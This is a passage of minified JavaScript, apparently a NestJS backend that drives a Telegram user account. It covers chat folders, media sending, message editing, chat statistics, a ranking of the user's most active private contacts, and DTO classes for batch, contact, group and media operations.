Promise.all(e.includedChats.map((e=>this.client.getInputEntity(e)))),excludePeers:await Promise.all((e.excludedChats||[]).map((e=>this.client.getInputEntity(e)))),pinnedPeers:[],contacts:e.includeContacts??!0,nonContacts:e.includeNonContacts??!0,groups:e.includeGroups??!0,broadcasts:e.includeBroadcasts??!0,bots:e.includeBots??!0,excludeMuted:e.excludeMuted??!1,excludeRead:e.excludeRead??!1,excludeArchived:e.excludeArchived??!1});return await this.client.invoke(new s.Api.messages.UpdateDialogFilter({id:t.id,filter:t})),{id:t.id,name:e.name,options:{includeContacts:t.contacts,includeNonContacts:t.nonContacts,includeGroups:t.groups,includeBroadcasts:t.broadcasts,includeBots:t.bots,excludeMuted:t.excludeMuted,excludeRead:t.excludeRead,excludeArchived:t.excludeArchived}}}async getChatFolders(){if(!this.client)throw new Error("Client not initialized");return(await this.client.invoke(new s.Api.messages.GetDialogFilters)).map((e=>({id:e.id??0,title:e.title??"",includedChatsCount:Array.isArray(e.includePeers)?e.includePeers.length:0,excludedChatsCount:Array.isArray(e.excludePeers)?e.excludePeers.length:0})))}async sendMediaBatch(e){if(!this.client)throw new Error("Client not initialized");const t=await Promise.all(e.media.map((async e=>{const t=await this.downloadFileFromUrl(e.url),i=new u.CustomFile(e.fileName||`media.${this.getMediaExtension(e.type)}`,t.length,"media",t),n=await this.client.uploadFile({file:i,workers:1}),o="photo"===e.type?new s.Api.InputMediaUploadedPhoto({file:n}):new s.Api.InputMediaUploadedDocument({file:n,mimeType:this.getMimeType(e.type),attributes:this.getMediaAttributes(e)});return new s.Api.InputSingleMedia({media:o,message:e.caption||"",entities:[]})})));return this.client.invoke(new s.Api.messages.SendMultiMedia({peer:e.chatId,multiMedia:t,silent:e.silent,scheduleDate:e.scheduleDate}))}getMimeType(e){switch(e){case"photo":return"image/jpeg";case"video":return"video/mp4";default:return"application/octet-stream"}}getMediaAttributes(e){const t=[];return e.fileName&&t.push(new s.Api.DocumentAttributeFilename({fileName:e.fileName})),"video"===e.type&&t.push(new s.Api.DocumentAttributeVideo({duration:0,w:1280,h:720,supportsStreaming:!0})),t}async editMessage(e){if(!this.client)throw new Error("Client not initialized");if(e.media){const t=await this.downloadFileFromUrl(e.media.url),i=new u.CustomFile(`media.${this.getMediaExtension(e.media.type)}`,t.length,"media",t),n=await this.client.uploadFile({file:i,workers:1}),o="photo"===e.media.type?new s.Api.InputMediaUploadedPhoto({file:n}):new s.Api.InputMediaUploadedDocument({file:n,mimeType:this.getMimeType(e.media.type),attributes:this.getMediaAttributes(e.media)});return this.client.invoke(new s.Api.messages.EditMessage({peer:e.chatId,id:e.messageId,media:o,message:e.text||""}))}if(e.text)return this.client.invoke(new s.Api.messages.EditMessage({peer:e.chatId,id:e.messageId,message:e.text}));throw new Error("Either text or media must be provided")}async getChats(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.getDialogs({...e,limit:e.limit||100});return Promise.all(t.map((async e=>{const t=e.entity;return{id:t.id.toString(),title:"title"in t?t.title:null,username:"username"in t?t.username:null,type:t instanceof s.Api.User?"user":t instanceof s.Api.Chat?"group":t instanceof s.Api.Channel?"channel":"unknown",unreadCount:e.unreadCount,lastMessage:e.message?{id:e.message.id,text:e.message.message,date:new Date(1e3*e.message.date)}:null}})))}async updateChatSettings(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.getEntity(e.chatId),i=[];if(e.title&&i.push(this.client.invoke(new s.Api.channels.EditTitle({channel:t,title:e.title}))),e.about&&i.push(this.client.invoke(new s.Api.messages.EditChatAbout({peer:t,about:e.about}))),e.photo){const n=await this.downloadFileFromUrl(e.photo),o=await this.client.uploadFile({file:new u.CustomFile("photo.jpg",n.length,"photo.jpg",n),workers:1});i.push(this.client.invoke(new s.Api.channels.EditPhoto({channel:t,photo:new s.Api.InputChatUploadedPhoto({file:o})})))}if(void 0!==e.slowMode&&i.push(this.client.invoke(new s.Api.channels.ToggleSlowMode({channel:t,seconds:e.slowMode}))),e.linkedChat){const n=await this.client.getEntity(e.linkedChat);i.push(this.client.invoke(new s.Api.channels.SetDiscussionGroup({broadcast:t,group:n})))}return e.username&&i.push(this.client.invoke(new s.Api.channels.UpdateUsername({channel:t,username:e.username}))),await Promise.all(i),!0}async getMessageStats(e){if(!this.client)throw new Error("Client not initialized");const t=e.fromDate||new Date,i=new Date(t);switch(e.period){case"day":i.setDate(i.getDate()-1);break;case"week":i.setDate(i.getDate()-7);break;case"month":i.setMonth(i.getMonth()-1)}const n=await this.client.getMessages(e.chatId,{limit:100,offsetDate:Math.floor(t.getTime()/1e3)}),o={total:n.length,withMedia:0,withLinks:0,withForwards:0,byHour:new Array(24).fill(0),byType:{text:0,photo:0,video:0,document:0,other:0}};for(const e of n){const t=new Date(1e3*e.date).getHours();if(o.byHour[t]++,e.media){o.withMedia++;const t=this.getMediaType(e.media);o.byType[t]=(o.byType[t]||0)+1}else e.message&&(e.message.match(/https?:\/\/[^\s]+/)&&o.withLinks++,o.byType.text++);e.fwdFrom&&o.withForwards++}return o}async getTopPrivateChats(){if(!this.client)throw new Error("Client not initialized");console.log("Starting getTopPrivateChats analysis...");const e=Date.now();console.log("Fetching dialogs...");const t=await this.client.getDialogs({limit:200});console.log(`Found ${t.length} total dialogs`);const i=t.filter((e=>e.isUser&&e.entity instanceof s.Api.User&&!e.entity.bot&&!e.entity.deleted&&!e.entity.fake&&"777000"!==e.entity.id.toString()&&"42777"!==e.entity.id.toString()));console.log(`Found ${i.length} valid private chats after filtering`),Math.floor(Date.now()/1e3);const n=[],o=await this.getCallLogsInternal();console.log(o);for(let e=0;e<i.length;e+=10){console.log(`Processing batch ${Math.floor(e/10)+1}/${Math.ceil(i.length/10)}`);const t=i.slice(e,e+10),r=await Promise.all(t.map((async e=>{const t=Date.now(),i=e.entity.id.toString(),n=e.entity;console.log(`Processing chat ${i} (${n.firstName||"Unknown"}) last: ${e.message.id}`);try{const e=await this.client.getMessages(i,{limit:30});if(e.length<20)return console.log(`Skipping chat ${i} - insufficient messages (${e.length}) | total: ${e.total} `),null;const r=await this.searchMessages({chatId:i,types:["video","photo","document","roundVideo"],limit:10});console.log(`Retrieved ${e.length} messages for chat ${i} | total: ${e.total}`);const a={total:0,incoming:0,outgoing:0,video:0},s={photos:r.photo.total,videos:r?.video?.total||0+r?.roundVideo?.total||0},c=o[i];console.log(c),c&&(a.total=c.totalCalls,a.incoming=c.incoming,a.outgoing=c.outgoing);const l=5*a.incoming+1*a.outgoing+15*a.video+6*s.videos+4*s.photos+1*e.total,p={videoCalls:15*a.video/l*100,incoming:5*a.incoming/l*100,outgoing:1*a.outgoing/l*100,mediaSharing:(6*s.videos+4*s.photos)/l*100,textMessages:1*e.total/l*100},d=Date.now()-t;return console.log(`Finished processing chat ${i} in ${d}ms with interaction score: ${l}`),{chatId:i,username:n.username,firstName:n.firstName,lastName:n.lastName,totalMessages:e.total,interactionScore:Math.round(100*l)/100,calls:a,media:s,activityBreakdown:p}}catch(e){return console.error(`Error processing chat ${i}:`,e),null}})));n.push(...r.filter(Boolean))}const r=n.sort(((e,t)=>t.interactionScore-e.interactionScore)).slice(0,10),a=Date.now()-e;return console.log(`getTopPrivateChats completed in ${a}ms. Found ${r.length} top chats`),r.forEach(((e,t)=>{console.log(`Top ${t+1}: ${e.firstName} (${e.username||"no username"}) - Score: ${e.interactionScore}`)})),r}}t.default=S},2849:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramValidationConfig=void 0;const o=i(3563);let r=class{};t.TelegramValidationConfig=r,r.PHONE_PATTERN=/^\+?[1-9]\d{1,14}$/,r.USERNAME_PATTERN=/^[a-zA-Z0-9_]{5,32}$/,r.MESSAGE_MAX_LENGTH=4096,r.CAPTION_MAX_LENGTH=1024,r.FILE_SIZE_LIMIT=2097152e3,r.BATCH_SIZE_LIMIT=100,r.ALLOWED_MEDIA_TYPES=["photo","video","document","voice","audio"],r.ALLOWED_PRIVACY_LEVELS=["everybody","contacts","nobody"],r.MESSAGE_TYPES=["all","text","photo","video","voice","document"],r.DEFAULT_PAGINATION={limit:20,maxLimit:100},t.TelegramValidationConfig=r=n([(0,o.Injectable)()],r)},6405:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ForwardBatchDto=t.BatchProcessDto=t.BatchItemDto=t.BaseBatchItemDto=t.BatchOperationType=void 0;const r=i(7403),a=i(9742),s=i(4922);var c;!function(e){e.FORWARD="forward",e.DELETE="delete",e.EDIT="edit"}(c||(t.BatchOperationType=c={}));class l{}t.BaseBatchItemDto=l,n([(0,a.ApiProperty)({description:"Chat ID for the operation"}),(0,r.IsString)(),o("design:type",String)],l.prototype,"chatId",void 0);class p extends l{}t.BatchItemDto=p,n([(0,a.ApiProperty)({description:"Message ID for message operations",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],p.prototype,"messageId",void 0),n([(0,a.ApiProperty)({description:"Source chat ID for forward operations",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],p.prototype,"fromChatId",void 0),n([(0,a.ApiProperty)({description:"Target chat ID for forward operations",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],p.prototype,"toChatId",void 0);class d{constructor(){this.batchSize=20,this.delayMs=1e3}}t.BatchProcessDto=d,n([(0,a.ApiProperty)({description:"Operation type",enum:c}),(0,r.IsEnum)(c),o("design:type",String)],d.prototype,"operation",void 0),n([(0,a.ApiProperty)({description:"Items to process",type:[p]}),(0,r.IsArray)(),o("design:type",Array)],d.prototype,"items",void 0),n([(0,a.ApiProperty)({description:"Number of items to process in each batch",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],d.prototype,"batchSize",void 0),n([(0,a.ApiProperty)({description:"Delay between batches in milliseconds",default:1e3}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],d.prototype,"delayMs",void 0);class u{}t.ForwardBatchDto=u,n([(0,a.ApiProperty)({description:"Source chat ID for forwarding"}),(0,r.IsString)(),o("design:type",String)],u.prototype,"fromChatId",void 0),n([(0,a.ApiProperty)({description:"Target chat ID for forwarding"}),(0,r.IsString)(),o("design:type",String)],u.prototype,"toChatId",void 0),n([(0,a.ApiProperty)({description:"Message IDs to forward",type:[Number]}),(0,r.IsArray)(),(0,r.ArrayMinSize)(1,{message:"At least one message ID is required"}),(0,r.ArrayMaxSize)(100,{message:"Cannot forward more than 100 messages at once"}),(0,r.IsNumber)({},{each:!0}),(0,s.Transform)((({value:e})=>Array.isArray(e)?e.map(Number):e)),o("design:type",Array)],u.prototype,"messageIds",void 0)},6684:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ChatStatisticsDto=t.ConnectionStatusDto=void 0;const r=i(9742);class a{}t.ConnectionStatusDto=a,n([(0,r.ApiProperty)({description:"Number of active connections"}),o("design:type",Number)],a.prototype,"activeConnections",void 0),n([(0,r.ApiProperty)({description:"Number of rate-limited connections"}),o("design:type",Number)],a.prototype,"rateLimited",void 0),n([(0,r.ApiProperty)({description:"Total number of operations"}),o("design:type",Number)],a.prototype,"totalOperations",void 0);class s{}t.ChatStatisticsDto=s,n([(0,r.ApiProperty)({description:"Total message count"}),o("design:type",Number)],s.prototype,"totalMessages",void 0),n([(0,r.ApiProperty)({description:"Active member count"}),o("design:type",Number)],s.prototype,"activeMembers",void 0),n([(0,r.ApiProperty)({description:"Message count by type"}),o("design:type",Object)],s.prototype,"messageTypes",void 0),n([(0,r.ApiProperty)({description:"Most active hours",type:[Number]}),o("design:type",Array)],s.prototype,"activeHours",void 0),n([(0,r.ApiProperty)({description:"Activity trend percentage"}),o("design:type",Number)],s.prototype,"activityTrend",void 0)},5768:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddContactsDto=t.ContactImportDto=t.ContactExportImportDto=t.ContactBlockListDto=t.ContactGroupDto=void 0;const r=i(7403),a=i(9742);class s{}t.ContactGroupDto=s,n([(0,a.ApiProperty)({description:"Name of the contact group"}),(0,r.IsString)(),o("design:type",String)],s.prototype,"name",void 0),n([(0,a.ApiProperty)({description:"User IDs to include in the group",type:[String]}),(0,r.IsArray)(),(0,r.IsString)({each:!0}),o("design:type",Array)],s.prototype,"userIds",void 0),n([(0,a.ApiProperty)({description:"Optional description for the group"}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],s.prototype,"description",void 0);class c{}t.ContactBlockListDto=c,n([(0,a.ApiProperty)({description:"User IDs to block/unblock",type:[String]}),(0,r.IsArray)(),(0,r.IsString)({each:!0}),o("design:type",Array)],c.prototype,"userIds",void 0),n([(0,a.ApiProperty)({description:"Whether to block or unblock the users"}),(0,r.IsBoolean)(),o("design:type",Boolean)],c.prototype,"block",void 0);class l{constructor(){this.includeBlocked=!1}}t.ContactExportImportDto=l,n([(0,a.ApiProperty)({enum:["vcard","csv"],description:"Export format type"}),(0,r.IsEnum)(["vcard","csv"]),o("design:type",String)],l.prototype,"format",void 0),n([(0,a.ApiProperty)({description:"Whether to include blocked contacts",required:!1,default:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Object)],l.prototype,"includeBlocked",void 0);class p{}t.ContactImportDto=p,n([(0,a.ApiProperty)({description:"Contacts to import",type:[Object]}),(0,r.IsArray)(),o("design:type",Array)],p.prototype,"contacts",void 0);class d{}t.AddContactsDto=d,n([(0,a.ApiProperty)({description:"Phone numbers to add",type:[String]}),(0,r.IsArray)(),(0,r.IsString)({each:!0}),o("design:type",Array)],d.prototype,"phoneNumbers",void 0),n([(0,a.ApiProperty)({description:"Name prefix to use for added contacts"}),(0,r.IsString)(),o("design:type",String)],d.prototype,"prefix",void 0)},5832:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateChatFolderDto=void 0;const r=i(9742),a=i(7403);class s{}t.CreateChatFolderDto=s,n([(0,r.ApiProperty)({description:"Name of the chat folder"}),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],s.prototype,"name",void 0),n([(0,r.ApiProperty)({description:"List of chat IDs to include in the folder"}),(0,a.IsArray)(),(0,a.IsNotEmpty)(),o("design:type",Array)],s.prototype,"includedChats",void 0),n([(0,r.ApiProperty)({description:"List of chat IDs to exclude from the folder",required:!1}),(0,a.IsArray)(),(0,a.IsOptional)(),o("design:type",Array)],s.prototype,"excludedChats",void 0),n([(0,r.ApiProperty)({description:"Include contacts in the folder",required:!1,default:!0}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"includeContacts",void 0),n([(0,r.ApiProperty)({description:"Include non-contacts in the folder",required:!1,default:!0}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"includeNonContacts",void 0),n([(0,r.ApiProperty)({description:"Include groups in the folder",required:!1,default:!0}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"includeGroups",void 0),n([(0,r.ApiProperty)({description:"Include broadcast channels in the folder",required:!1,default:!0}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"includeBroadcasts",void 0),n([(0,r.ApiProperty)({description:"Include bots in the folder",required:!1,default:!0}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"includeBots",void 0),n([(0,r.ApiProperty)({description:"Exclude muted chats from the folder",required:!1,default:!1}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"excludeMuted",void 0),n([(0,r.ApiProperty)({description:"Exclude read chats from the folder",required:!1,default:!1}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"excludeRead",void 0),n([(0,r.ApiProperty)({description:"Exclude archived chats from the folder",required:!1,default:!1}),(0,a.IsBoolean)(),(0,a.IsOptional)(),o("design:type",Boolean)],s.prototype,"excludeArchived",void 0)},2760:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.createGroupDto=t.ChatCleanupDto=t.GroupSettingsDto=t.AdminOperationDto=t.GroupMemberOperationDto=t.BaseGroupOperationDto=t.AdminPermissionsDto=t.AdminPermission=void 0;const r=i(7403),a=i(9742),s=i(4922);var c;!function(e){e.CHANGE_INFO="changeInfo",e.POST_MESSAGES="postMessages",e.EDIT_MESSAGES="editMessages",e.DELETE_MESSAGES="deleteMessages",e.BAN_USERS="banUsers",e.INVITE_USERS="inviteUsers",e.PIN_MESSAGES="pinMessages",e.ADD_ADMINS="addAdmins",e.ANONYMOUS="anonymous",e.MANAGE_CALL="manageCall"}(c||(t.AdminPermission=c={}));class l{constructor(){this.changeInfo=!0,this.postMessages=!0,this.editMessages=!0,this.deleteMessages=!0,this.banUsers=!0,this.inviteUsers=!0,this.pinMessages=!0,this.addAdmins=!1,this.anonymous=!1,this.manageCall=!0}}t.AdminPermissionsDto=l,n([(0,a.ApiProperty)({description:"Permission to change group info",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"changeInfo",void 0),n([(0,a.ApiProperty)({description:"Permission to post messages",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"postMessages",void 0),n([(0,a.ApiProperty)({description:"Permission to edit messages",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"editMessages",void 0),n([(0,a.ApiProperty)({description:"Permission to delete messages",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"deleteMessages",void 0),n([(0,a.ApiProperty)({description:"Permission to ban users",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"banUsers",void 0),n([(0,a.ApiProperty)({description:"Permission to invite users",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"inviteUsers",void 0),n([(0,a.ApiProperty)({description:"Permission to pin messages",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"pinMessages",void 0),n([(0,a.ApiProperty)({description:"Permission to add new admins",default:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"addAdmins",void 0),n([(0,a.ApiProperty)({description:"Permission to remain anonymous",default:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"anonymous",void 0),n([(0,a.ApiProperty)({description:"Permission to manage voice chats",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],l.prototype,"manageCall",void 0);class p{}t.BaseGroupOperationDto=p,n([(0,a.ApiProperty)({description:"Group ID"}),(0,r.IsString)(),(0,r.IsNotEmpty)(),o("design:type",String)],p.prototype,"groupId",void 0);class d extends p{}t.GroupMemberOperationDto=d,n([(0,a.ApiProperty)({description:"Array of user IDs",type:[String]}),(0,r.IsString)({each:!0}),o("design:type",Array)],d.prototype,"members",void 0);class u extends p{}t.AdminOperationDto=u,n([(0,a.ApiProperty)({description:"User ID to promote/demote"}),(0,r.IsString)(),(0,r.IsNotEmpty)(),o("design:type",String)],u.prototype,"userId",void 0),n([(0,a.ApiProperty)({description:"Whether to promote or demote",required:!0}),(0,r.IsBoolean)(),o("design:type",Boolean)],u.prototype,"isPromote",void 0),n([(0,a.ApiProperty)({description:"Admin permissions",required:!1}),(0,r.IsOptional)(),(0,r.ValidateNested)(),(0,s.Type)((()=>l)),o("design:type",l)],u.prototype,"permissions",void 0),n([(0,a.ApiProperty)({description:"Custom admin rank/title",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],u.prototype,"rank",void 0);class m extends p{constructor(){super(...arguments),this.megagroup=!0,this.forImport=!1}}t.GroupSettingsDto=m,n([(0,a.ApiPropertyOptional)({description:"Group title",required:!1}),(0,r.IsString)(),(0,r.IsOptional)(),o("design:type",String)],m.prototype,"title",void 0),n([(0,a.ApiPropertyOptional)({description:"Group username",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],m.prototype,"username",void 0),n([(0,a.ApiPropertyOptional)({description:"Group description",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],m.prototype,"description",void 0),n([(0,a.ApiPropertyOptional)({description:"Address or location of the group",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],m.prototype,"address",void 0),n([(0,a.ApiPropertyOptional)({description:"Slow mode delay in seconds",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],m.prototype,"slowMode",void 0),n([(0,a.ApiPropertyOptional)({description:"Whether the group is a megagroup",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],m.prototype,"megagroup",void 0),n([(0,a.ApiPropertyOptional)({description:"Whether the group is for import",default:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],m.prototype,"forImport",void 0),n([(0,a.ApiPropertyOptional)({description:"Member restrictions",required:!1}),(0,r.IsOptional)(),(0,r.IsObject)(),o("design:type",Object)],m.prototype,"memberRestrictions",void 0);class g extends p{}t.ChatCleanupDto=g,n([(0,a.ApiProperty)({description:"Chat ID to clean up"}),(0,r.IsString)(),(0,r.IsNotEmpty)(),o("design:type",String)],g.prototype,"chatId",void 0),n([(0,a.ApiProperty)({description:"Delete messages before this date",required:!1}),(0,r.IsOptional)(),(0,r.IsDateString)(),(0,s.Transform)((({value:e})=>e?new Date(e):void 0)),o("design:type",Date)],g.prototype,"beforeDate",void 0),n([(0,a.ApiProperty)({description:"Only delete media messages",required:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],g.prototype,"onlyMedia",void 0),n([(0,a.ApiProperty)({description:"Exclude pinned messages",required:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],g.prototype,"excludePinned",void 0);class h{constructor(){this.slowMode=0,this.megagroup=!0,this.forImport=!1}}t.createGroupDto=h,n([(0,a.ApiProperty)({description:"Group title",required:!0}),(0,r.IsString)(),(0,r.IsNotEmpty)(),o("design:type",String)],h.prototype,"title",void 0),n([(0,a.ApiPropertyOptional)({description:"Group description",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],h.prototype,"description",void 0),n([(0,a.ApiPropertyOptional)({description:"Address or location of the group",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),o("design:type",String)],h.prototype,"address",void 0),n([(0,a.ApiPropertyOptional)({description:"Slow mode delay in seconds",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),o("design:type",Number)],h.prototype,"slowMode",void 0),n([(0,a.ApiPropertyOptional)({description:"Whether the group is a megagroup",default:!0}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],h.prototype,"megagroup",void 0),n([(0,a.ApiPropertyOptional)({description:"Whether the group is for import",default:!1}),(0,r.IsOptional)(),(0,r.IsBoolean)(),o("design:type",Boolean)],h.prototype,"forImport",void 0),n([(0,a.ApiPropertyOptional)({description:"Member restrictions",required:!1}),(0,r.IsOptional)(),(0,r.IsObject)(),o("design:type",Object)],h.prototype,"memberRestrictions",void 0)},9979:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__exportStar||function(e,t){for(var i in e)"default"===i||Object.prototype.hasOwnProperty.call(t,i)||n(t,e,i)};Object.defineProperty(t,"__esModule",{value:!0}),t.AdminPermission=t.MediaType=t.BatchOperationType=void 0,o(i(3538),t),o(i(6405),t),o(i(2993),t),o(i(3426),t),o(i(2354),t),o(i(2760),t),o(i(5768),t),o(i(3429),t),o(i(7144),t);var r=i(6405);Object.defineProperty(t,"BatchOperationType",{enumerable:!0,get:function(){return r.BatchOperationType}});var a=i(2993);Object.defineProperty(t,"MediaType",{enumerable:!0,get:function(){return a.MediaType}});var s=i(2760);Object.defineProperty(t,"AdminPermission",{enumerable:!0,get:function(){return s.AdminPermission}})},2993:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.VoiceMessageDto=t.SendMediaAlbumDto=t.MediaAlbumItemDto=t.SendMediaDto=t.MediaFilterDto=t.MediaSearchDto=t.BaseMediaOperationDto=t.MediaType=void 0;const r=i(7403),a=i(9742),s=i(4922);var c;!function(e){e.PHOTO="photo",e.VIDEO="video",e.DOCUMENT="document",e.VOICE="voice",e.AUDIO="audio"}(c||(t.MediaType=c={}));class l{}t.BaseMediaOperationDto=l,n([(0,a.ApiProperty)({description:"Chat ID for media operation"}),(0,r.IsString)(),o("design:type",String)],l.prototype,"chatId",void 0);class p extends l{constructor(){super(...arguments),this.limit=50}}t.MediaSearchDto=p,n([(0,a.ApiProperty)({description:"Media types to include",enum:c,isArray:!0}),(0,r.IsArray)(),(0,r.IsEnum)(c,{each:!0}),o("design:type",Array)],p.prototype,"types",void 0),n([(0,a.ApiProperty)({description:"Message offset",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),(0,s.Transform)((({value:e})=>parseInt(e))),o("design:type",Number)],p.prototype,"offset",void 0),n([(0,a.ApiProperty)({description:"Items per page",required:!1}),(0,r.IsOptional)(),(0,r.IsNumber)(),(0,s.Transform)((({value:e})=>parseInt(e))),o("design:type",Number)],p.prototype,"limit",void 0);class d extends p{}t.MediaFilterDto=d,n([(0,a.ApiProperty)({description:"Start date for filtering",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),(0,s.Transform)((({value:e})=>e?new Date(e).toISOString():void 0)),o("design:type",String)],d.prototype,"startDate",void 0),n([(0,a.ApiProperty)({description:"End date for filtering",required:!1}),(0,r.IsOptional)(),(0,r.IsString)(),(0,s.Transform)((({value:e})=>e?new Date(e).toISOString():void 